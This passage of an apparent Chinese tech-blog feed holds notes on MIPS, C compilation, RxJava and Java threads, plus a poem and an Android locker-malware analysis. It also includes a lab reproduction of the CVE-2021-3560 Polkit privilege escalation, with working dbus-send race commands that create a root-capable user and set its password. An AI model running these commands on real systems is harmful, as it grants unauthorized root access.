rt)</p><p><strong>j&#x2F;jr&#x2F;jal&#x2F;jalr</strong>:              j直接跳转 PC &#x3D; { (PC+4) [31,28] , addr, 00}；jr使用寄存器跳转 PC &#x3D; rs； jal  $31 &#x3D; PC;PC &#x3D; {(PC+4) [31,28],addr,00}</p><p><strong>beq&#x2F;beqz&#x2F;benz&#x2F;bne</strong>:      条件转移eq相等，z零，ne不等。 beq , PC &#x3D; (rs &#x3D;&#x3D; rt) ? PC+4+im &lt;&lt; 2 :  PC ; bne , PC &#x3D; (rs !&#x3D; rt) ? PC+4+im &lt;&lt; 2 :  PC </p><p><strong>lui</strong>:                    把一个16位的立即数填入到寄存器的高16位，低16位补零。 rt &#x3D; im * 65536(2^16)</p><p><strong>lw</strong>:                    rt &#x3D; memory[ rs + im]</p><p><strong>sw</strong>:                    memory[ rs + im] &#x3D; rt</p><p><strong>sll&#x2F;srl</strong>:                 逻辑左移&#x2F;右移。 rd &#x3D; rs &lt;&lt; shamt ; rd &#x3D; rs &gt;&gt; shamt </p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-3560 Polkit权限提升漏洞复现</title>
    <link href="/article/86aaf27b.html"/>
    <url>/article/86aaf27b.html</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-3560-Polkit权限提升漏洞"><a href="#CVE-2021-3560-Polkit权限提升漏洞" class="headerlink" title="CVE-2021-3560 Polkit权限提升漏洞"></a>CVE-2021-3560 Polkit权限提升漏洞</h1><p>6月3号，RedHat修复了一个存在七年的权限提升漏洞，该漏洞通过Linux  Polkit 来创建新的root用户</p><p>Polkit 是linux下的一个系统服务，允许特权进程给非特权进程提供服务</p><blockquote><p>Polkit 则会根据特权进程提供的信息和权限配置文件进行认证</p><p>认证完成后将认证结果返回给特权进程</p><p>特权进程会根据认证结果来决定是否给非特权进程提供服务</p><p>而我们在认证操作中断开连接，导致无法获取认证结果</p><p>具体后边会详细分析</p></blockquote><p>由于systemd使用Polkit，所以几乎所有使用systemd的Linux都自带polkit</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>环境：ubuntu20.04  </p><blockquote><p><a href="http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso">http://releases.ubuntu.com/20.04/ubuntu-20.04.2.0-desktop-amd64.iso</a> </p></blockquote><p>ssh（ 在本地ssh下操作）</p><blockquote><p>sudo apt install ssh</p><p>sudo service ssh start</p><p>ssh <a href="mailto:&#x75;&#115;&#x65;&#x72;&#110;&#97;&#109;&#101;&#64;&#49;&#x32;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;">&#x75;&#115;&#x65;&#x72;&#110;&#97;&#109;&#101;&#64;&#49;&#x32;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;</a></p></blockquote><p>具体为什么要用ssh，这里不做赘述，可以自行百度dbus</p><p>dbus-send发送D-Bus消息的工具，主要用于测试</p><p>可以通过dbus-send从命令行触发polkit</p><p>通过dbus-send构造语句，来创建一个新用户</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141819448.png" alt="image-20220402141819448"></p><p>正常情况返回肯定是认证不通过的</p><p>上面说了通过中断来实现认证通过</p><p>所以继续构造语句</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts org.freedesktop.Accounts.CreateUser string:yunku string:”YunKuSec” int32:1 &amp; sleep 0.009s ; kill $!</p></blockquote><p>这里是开始执行后0.009秒断开连接</p><p>这里多久断开连接要看具体执行时间，可以在前面加time 测试</p><p>我这里大概时间在0.015秒左右，所以我提前在0.009秒断开，具体测试时看执行时间</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141825690.png" alt="image-20220402141825690"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141832450.png" alt="image-20220402141832450"></p><p>运气比较好，一次就成了，有个可能运气不太好，需要多试个千八百次的</p><p>然后用 id 可以看到语句中构造的yunku 已经存在了，而且在sudo组，具有root权限</p><p>现在已经成功利用漏洞创建了用户，但是该用户没有用户名，所以无法登陆</p><p>继续构造语句来设置密码</p><p><code>这里涉及到一个知识点，dbus接口设置密码需要通过散列值</code></p><p>通过openssl可以生成散列值(-5是指定 sha256 算法来生成散列值， -6 是 sha512，-1 是 md5)</p><blockquote><p>openssl passwd -5 password</p><p>(这里password是个人需要设置的密码)</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141841022.png" alt="image-20220402141841022"></p><p>构造设置密码语句(User1001 是创建的sudo用户uid 可以通过id 用户名查看， string 后放置密码散列值)</p><blockquote><p>dbus-send –system –dest&#x3D;org.freedesktop.Accounts –type&#x3D;method_call –print-reply &#x2F;org&#x2F;freedesktop&#x2F;Accounts&#x2F;User1001 org.freedesktop.Accounts.User.SetPassword string:’$5$P28GOS55linQ0Fe&#x2F;$2dn4a1duWxR9wFIYeO7qfO7ieDZvE25zPh1oxm3&#x2F;Pn6’ string:Whatever &amp; sleep 0.009s ; kill $! </p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141847603.png" alt="image-20220402141847603"></p><p>多试这个也需要多试几次</p><p>成功之后可以登陆尝试</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141854349.png" alt="image-20220402141854349"></p><p>至此，复现结束！</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过dbus创建新用户时，dbus-send向account-daemon发起请求会先发送到dbus-daemon</p><p>dbus-daemon会先添加dbus id（这里方便理解 id为 10）到请求中，然后将请求发给account-daemon</p><p>account-daemon收到请求后向poklit询问id为10的连接有没有权限</p><p>poklit向dbus-daemon询问该连接的uid </p><p>如果返回的uid为0，就授权，否则打开验证密码窗口让用户输入密码</p><p>以上步骤完成后</p><p>poklit返回true给account-daemon</p><p>account-daemon创建新用户</p><p>但是！</p><p>如果我们在<code>poklit向dbus-daemon询问该连接的uid</code>时断开，那这个连接就不存在</p><p>不存在，就会返回错误</p><p>而poklit的错误处理信息不会拒绝该请求，而是将uid视为0，来授权</p>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>智能合约</title>
    <link href="/article/c85b8ed3.html"/>
    <url>/article/c85b8ed3.html</url>
    
    <content type="html"><![CDATA[<p>基于以太坊的solidity智能合约。</p><p>在线编辑器环境位置：<a href="https://remix.ethereum.org/">https://remix.ethereum.org</a></p><p>智能合约文件是以.sol结尾</p><div class="code-wrapper"><pre><code class="hljs solidity">pragma solidity ^0.4.0;//预编译的作用，^代表版本向上兼容，兼容0.4.x，不能兼容到0.5.0</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ROT13算法</title>
    <link href="/article/dd959000.html"/>
    <url>/article/dd959000.html</url>
    
    <content type="html"><![CDATA[<h1 id="ROT13加密算法"><a href="#ROT13加密算法" class="headerlink" title="ROT13加密算法"></a>ROT13加密算法</h1><p>凯撒加密的一个变种</p><p>单纯的将所有的字符后推13位，超过Z(z)的从A(a)开始换</p><p>这就导致他可以用一个算法实现加解密</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入要加解密的key：&quot;</span>)flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:    n = <span class="hljs-built_in">ord</span>(i)    <span class="hljs-keyword">if</span> (n &gt;= <span class="hljs-number">97</span> <span class="hljs-keyword">and</span> n &lt; <span class="hljs-number">110</span>) <span class="hljs-keyword">or</span> (n &gt;= <span class="hljs-number">65</span> <span class="hljs-keyword">and</span> n &lt;= <span class="hljs-number">78</span>) :        flag += <span class="hljs-built_in">chr</span>(n+<span class="hljs-number">13</span>)    <span class="hljs-keyword">elif</span> (n &gt;= <span class="hljs-number">110</span> <span class="hljs-keyword">and</span> n &lt; <span class="hljs-number">122</span>) <span class="hljs-keyword">or</span> (n &gt;= <span class="hljs-number">78</span> <span class="hljs-keyword">and</span> n &lt;= <span class="hljs-number">90</span>):        flag += <span class="hljs-built_in">chr</span>(n-<span class="hljs-number">13</span>)    <span class="hljs-keyword">else</span>:        flag += i<span class="hljs-built_in">print</span>(flag)</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一个c语言代码变为c语言程序的全过程</title>
    <link href="/article/5aedeb05.html"/>
    <url>/article/5aedeb05.html</url>
    
    <content type="html"><![CDATA[<div class="code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span>&#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>这样一段代码通过编译器进行如下操作后来得到可执行文件</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140948521.png" alt="image-20220402140948521"></p><p>下面详细说明下每个步骤</p><h1 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h1><p>根据<code>#</code>开头的命令，将头文件命令行代码插入代码</p><p>可以用gcc -E hello.c -o hello.i 来只完成预处理</p><p>打开hello.i 可以发现代码前边多处500多行代码</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140956951.png" alt="image-20220402140956951"></p><p>这个可以在本机目录下找到stdio.h这个文件</p><p>这就是预处理的整个过程</p><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>将hello.i编译成汇编语言，这个过程之后程序会更接近机器语言</p><blockquote><p>这里解释下什么是机器语言，什么是高级语言</p><p>我们定义 00100 1 0的含义为1 + 0 即 00100 为加号 1 为被加数 0 为加数</p><p>这样写偏向于底层，在程序员看来是非常不直接的，不方便的。（这种二进制代码也被称为硬编码）</p><p>那我们再次规定，我们用add 1 0 来表示1 + 0，这样子容易理解多了，</p><p>（类似于早期这种比较简单语言称为汇编语言，这样的代码需要巨大的代码量来完成一些简单的逻辑）</p><p>人们使用汇编语言将常用的一些逻辑二次封装成为比较人性化的代码</p><p>再把 add 1 0 二次封装，为 1 + 0 这样，就很方便使用和理解</p><p>（这种代码就被称为高级语言，这种语言更符合人类的使用习惯）</p><p>上面这串代码从下往上的过程，就被称为代码的编译，处理它们的软件被称为编译器</p></blockquote><p>使用 gcc -S hello.i -o hello.s可以将预处理后的文件编译为汇编语言的文件</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141005753.png" alt="image-20220402141005753"></p><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><p>将hello.s 打包成<code>可重定位目标程序</code> hello.o</p><p>这一步已经将机器语言变成了二进制文件，用文本文件打开后会看到乱码</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141013182.png" alt="image-20220402141013182"></p><p>但仍然可以用二进制文本编辑器查看</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141021358.png" alt="image-20220402141021358"></p><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>我们上边说过，早期人们将一些常用的逻辑打包，</p><p>一些常用逻辑包放在在标准库，使大家不需要每个函数都存放在代码里</p><p>就比如我们使用的printf 函数在标准库中的printf.o文件</p><p>在链接时，将hello.o 和printf.o两个文件打包成可执行文件</p><p>使用 gcc hello.o -o hello 就可以链接需要的文件得到可执行文件</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Rxjava学习笔记</title>
    <link href="/article/f44be05a.html"/>
    <url>/article/f44be05a.html</url>
    
    <content type="html"><![CDATA[<h1 id="RxJava"><a href="#RxJava" class="headerlink" title="RxJava"></a>RxJava</h1><p>是基于事件流，进行<code>异步操作</code>的库，类似于android中的AsyncTask，Handler的作用</p><p>特点在于逻辑简洁实现优雅使用简单。</p><h1 id="Rxjava的逻辑流程"><a href="#Rxjava的逻辑流程" class="headerlink" title="Rxjava的逻辑流程"></a>Rxjava的逻辑流程</h1><p>顾客到饭店吃饭，找服务员点菜，服务员到厨房下单，后厨根据顺序烹调出对应的菜式，然后按顺序一一送给顾客</p><p>在整个逻辑中有四个角色</p><p>顾客：被观察者（observable）</p><p>厨房：观察者（Observer）</p><p>服务员：订阅（SubScribe）</p><p>菜式：事件（Event）</p><p>被观察者产生事件，观察者接收事件并且给出响应动作</p><p>订阅连接观察者和被观察者</p><p>事件是被观察者 &amp; 观察者 沟通的载体</p><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><p>引入依赖</p><div class="code-wrapper"><pre><code class="hljs xml">implementation &quot;io.reactivex.rxjava3:rxjava:3.x.y&quot;（这里xy指的是版本号，尽量去github自己看，我这里用的是3.0.13）</code></pre></div><p>创建方式，还是一般创建方式</p><p>我这里使用的是rxjava3，直接写在了mainactivity中</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//正常创建形式</span><span class="hljs-comment">//创建被观察者</span>        Observable.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObservableOnSubscribe</span>&lt;String&gt;() &#123;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">subscribe</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> ObservableEmitter&lt;String&gt; emitter)</span> <span class="hljs-keyword">throws</span> Throwable &#123;                <span class="hljs-keyword">try</span> &#123;                    <span class="hljs-comment">//在这里传递参数</span>                    emitter.onNext(<span class="hljs-string">&quot;这是第一个参数&quot;</span>);                    emitter.onComplete();                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;                    <span class="hljs-comment">//在这里传递异常</span>                    emitter.onError(e);                &#125;            &#125;            <span class="hljs-comment">//这里相当于直接创建观察者并订阅</span>        &#125;).subscribe(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Observer</span>&lt;String&gt;() &#123;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSubscribe</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Disposable d)</span> &#123;                Log.d(TAG,<span class="hljs-string">&quot;调用subscribe&quot;</span>);            &#125;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNext</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> String s)</span> &#123;                Log.d(TAG,s);            &#125;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Throwable e)</span> &#123;                Log.d(TAG,<span class="hljs-string">&quot;错误被调用&quot;</span>);            &#125;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onComplete</span><span class="hljs-params">()</span> &#123;                Log.d(TAG,<span class="hljs-string">&quot;onComplete被调用&quot;</span>);            &#125;        &#125;); <span class="hljs-comment">//just方法直接传递数据</span>        Observable.just(<span class="hljs-string">&quot;测试参数&quot;</span>).subscribe(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Observer</span>&lt;String&gt;() &#123;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSubscribe</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Disposable d)</span> &#123;                Log.d(TAG,<span class="hljs-string">&quot;调用subscribe&quot;</span>);            &#125;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNext</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> String s)</span> &#123;                Log.d(TAG,s);            &#125;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Throwable e)</span> &#123;                Log.d(TAG,<span class="hljs-string">&quot;错误被调用&quot;</span>);            &#125;            <span class="hljs-meta">@Override</span>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onComplete</span><span class="hljs-params">()</span> &#123;                Log.d(TAG,<span class="hljs-string">&quot;onComplete被调用&quot;</span>);            &#125;        &#125;);</code></pre></div><p>rxjava可以传递数组</p><p>不过rxjava3抛弃了from改用了具体的from类型</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">int</span>[] intArray = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;;Observable.fromArray(intArray).subscribe(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Observer</span>&lt;<span class="hljs-type">int</span>[]&gt;() &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSubscribe</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Disposable d)</span> &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNext</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-meta">@NonNull</span> [] ints)</span> &#123;        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> a : ints)&#123;            Log.d(TAG, a+<span class="hljs-string">&quot;&quot;</span>);        &#125;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> Throwable e)</span> &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onComplete</span><span class="hljs-params">()</span> &#123;    &#125;&#125;);</code></pre></div><p>这里具体使用见文档，不多做赘述</p>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>老去的尼尼卡 --英雄的迟暮</title>
    <link href="/article/f8245e93.html"/>
    <url>/article/f8245e93.html</url>
    
    <content type="html"><![CDATA[<h2 id="老去的尼尼卡"><a href="#老去的尼尼卡" class="headerlink" title="老去的尼尼卡"></a>老去的尼尼卡</h2><p>我们的尼尼卡老去了， </p><p>他伟岸的肩膀不再挺拔…… </p><p>这位满头白发的老人</p><p>真的曾经拥有钢铁一般的力量？ </p><p>啊，母亲啊！</p><p>到底有多少次他挥舞着“土狼”镰刀， </p><p>袒胸露背，</p><p>在麦田的尽头突然大声地咆哮。 </p><p>他肯定搬移过大山 把它们并排而列， </p><p>他那滴汗的脸上 喷射着火焰和浓烟。 </p><p>可他现在连膝盖都动不了，</p><p>岁月割去了它们。 </p><p>他只能躺下，</p><p>或者做梦，</p><p>或者告诉他子孙的子孙 </p><p>他曾经的过往。 </p><p>他偶尔会听见 </p><p>附近麦田传来的歌声， </p><p>他那曾经坚硬的心开始愉悦地跳动。 </p><p>他颤抖地走出了门。 </p><p>他拄着拐杖往前走了几步。 </p><p>当他看到年轻的小伙， </p><p>他安慰地笑了起来。 </p><p>——索塞罗</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140855691.png" alt="image-20220402140855691"></p>]]></content>
    
    
    <categories>
      
      <category>诗</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一个安卓锁机软件的逆向分析</title>
    <link href="/article/e48e684a.html"/>
    <url>/article/e48e684a.html</url>
    
    <content type="html"><![CDATA[<p>前两天在吾爱上看到有人求助手机被锁，顺手吧样本下载了，分析下。</p><p>样本桌面是一个百度网盘的图标</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141506388.png" alt="image-20220402141506388"></p><p>这像素一看就是假的。。。</p><p>打开后是个root锁机，这里还是提醒各位没事不要随便开root权限，这都2021年了，还有这种垃圾软件，也是服了！</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141514360.png" alt="image-20220402141514360"></p><p>直接jeb</p><p>启动后看到这变量名是真恶心啊！！！</p><p>发现MainActivity中只调用了一个hh</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141521365.png" alt="image-20220402141521365"></p><h2 id="第一个页面"><a href="#第一个页面" class="headerlink" title="第一个页面"></a>第一个页面</h2><p>这里发现第一个页面是第四层函数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141530861.png" alt="image-20220402141530861"></p><p>这里主要是q()中是个文字编码，提取出来，把这两行解密下。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141538590.png" alt="image-20220402141538590"></p><p>这里有一行解码后发现是一个网站，猜测可能是访问网站返回解码</p><p>100000005线程处跟进</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141544779.png" alt="image-20220402141544779"></p><p>本质是做了一个判断，继续跟进isINTERET()</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141552826.png" alt="image-20220402141552826"></p><p>这里发现9160，尝试下，对了</p><p>然后进入第二个页面</p><p>（还是多重锁机骗钱，可以很骚，很傻逼）</p><h2 id="第二个页面"><a href="#第二个页面" class="headerlink" title="第二个页面"></a>第二个页面</h2><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141602192.png" alt="image-20220402141602192"></p><p>第二层是第五层的函数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141609649.png" alt="image-20220402141609649"></p><p>跟进100000008</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141617211.png" alt="image-20220402141617211"></p><p>点击屏幕30次会出现两个控件</p><p>然后跟进100000009</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141624353.png" alt="image-20220402141624353"></p><p>这里try里边先做了一个字符编码，直接把m这个函数摘下来稍作修改</p><p>解码后是9，5，10</p><p>然后通过这三个数做了运算</p><p>同样吧加密摘下来</p><p>这个加密处理处v0.val$test 是界面给的序列号</p><p>这个序列号是通过取随机数然后通过m下的方法处理后的（这个软件变量方法名太恶心了，就在第五层的倒数第三行）</p><p>还是老办法，把这个函数取出来处理下</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141631663.png" alt="image-20220402141631663"></p><p>把v1，v2 的值交换下就可以了</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141638554.png" alt="image-20220402141638554"></p><p>转第二层锁</p><h2 id="第三个页面"><a href="#第三个页面" class="headerlink" title="第三个页面"></a>第三个页面</h2><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141647476.png" alt="image-20220402141647476"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141654580.png" alt="image-20220402141654580"></p><p>这个和上一个差不多做法就不细说了</p><p>把改过的函数挂出来吧（这里边函数或者变量名是修改过的，后边会把整个项目脚本放上来，可以看那个）</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141702375.png" alt="image-20220402141702375"></p><p>解出来后跳到第四个页面</p><h2 id="第四个页面"><a href="#第四个页面" class="headerlink" title="第四个页面"></a>第四个页面</h2><p>第三层函数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141710260.png" alt="image-20220402141710260"></p><p>和上边也是差不多</p><p>继续改函数</p><p>这里要注意 粉红兔 这个实例在创建的时候传了个 fuck参数（当时找了好久，好烦呀）</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141718598.png" alt="image-20220402141718598"></p><p><img src="https://i.loli.net/2021/05/28/njByRldAL7HgmqP.png" alt="image-20210528183252244"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141726058.png" alt="image-20220402141726058"></p><p>搞定，下一层下一层</p><h2 id="第五个页面"><a href="#第五个页面" class="headerlink" title="第五个页面"></a>第五个页面</h2><p>第一层函数，看起来也差不多</p><p>看第四个页面，不过这里又个迷惑人的点</p><p>随机码多了一个b，解码时删掉这个解就好</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141734543.png" alt="image-20220402141734543"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141741322.png" alt="image-20220402141741322"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>没有什么特别奇怪的算法，都是大差不差，刚去看了下吾爱，好像有师傅提前解出来了</p><p>网站也是被挺多人留言了</p><p>分析的时候去找过那个qq群，好像还在运行，这种人就挺可恶的</p><p>拿技术做坏事，为人所不齿</p><p>脚本因为是分析的时候写的，乱得很，这里先放上来</p><p><a href="https://gitee.com/p1piyang/backward-analysis/tree/master">https://gitee.com/p1piyang/backward-analysis/tree/master</a></p><p>累死了！！！</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>java多线程</title>
    <link href="/article/11bde6ec.html"/>
    <url>/article/11bde6ec.html</url>
    
    <content type="html"><![CDATA[<p>(因为是迁移过来的，好多图片都丢失了，建议自己复制代码运行看一下)</p><h1 id="串行与并发"><a href="#串行与并发" class="headerlink" title="串行与并发"></a>串行与并发</h1><ol><li>串行 当有多个任务需要执行时，是按照从前往后的顺序去执行的顺序就叫串行。<br>类比的话就是一条单行道上的车辆肯定是前后顺序，不可能同时通行多辆车。 </li><li>并发是让多个任务同时执行。<br>一条马路上的两条单行车道上两辆车同时执行，这两辆车就是并发的状态。</li></ol><p>程序的运行状态一般是串行与并发同步进行的。 </p><h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><p>进程是对一个程序运行是各种资源的描述（cpu，内存等），进程实现多个任务并发运行。<br>进程资源不共享。</p><h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><p>线程是进程的最小单元。<br>如果把进程看成一座工厂，进程就是进程中的流水线。<br>一个进程中有多个线程，且一个进程中有多个线程。<br>线程资源共享（临界资源）。 </p><h1 id="并发是怎么做到的"><a href="#并发是怎么做到的" class="headerlink" title="并发是怎么做到的"></a>并发是怎么做到的</h1><p>计算机给某个进程（或线程）分配固定的cpu时间，让cpu快速的在不同进程（或线程）中快速切换，来造成同时运行的假象。<br>cpu的运行速度是非常快的，人反应不过来，这才导致的并发假象。 （是假象）</p><h1 id="线程的生命周期"><a href="#线程的生命周期" class="headerlink" title="线程的生命周期"></a>线程的生命周期</h1><p>从被实例化完成到被销毁。<br>线程的状态:</p><ol><li>新生态 New ：一个线程被实例化完成，没有做任何操作。</li><li>就绪态 Ready：一个线程已经被开启，已经开始争抢cpu时间片（某段时间去运行这个线程）。</li><li>运行态 Run： 一个线程抢到了cpu时间片，已经开始执行现成的逻辑。</li><li>阻塞态 Interrupt：正在运行的过程中受到某些操作的影响，放弃了已经获取到的cpu时间片，并且不再参与cpu时间片的争抢，处于挂起状态。（scanf sleep join等）</li><li>死亡态 Dead：一个线程对象被销毁。</li></ol><h1 id="创建实例化线程"><a href="#创建实例化线程" class="headerlink" title="创建实例化线程"></a>创建实例化线程</h1><ol><li><p>继承Thread类，自定义线程类</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.p1.theard;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadCreate1</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">//实例化子线程</span>        <span class="hljs-type">MyThread</span> <span class="hljs-variable">myThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>();        <span class="hljs-comment">//通过start方法开启线程，如果直接调用run方法他会把线程当作普通类来运行</span>        myThread.start();        <span class="hljs-comment">//在线程之后打印句话来感受下线程</span>        System.out.println(<span class="hljs-string">&quot;主线程逻辑&quot;</span>);    &#125;&#125;<span class="hljs-comment">//继承Thread并重写run方法</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; 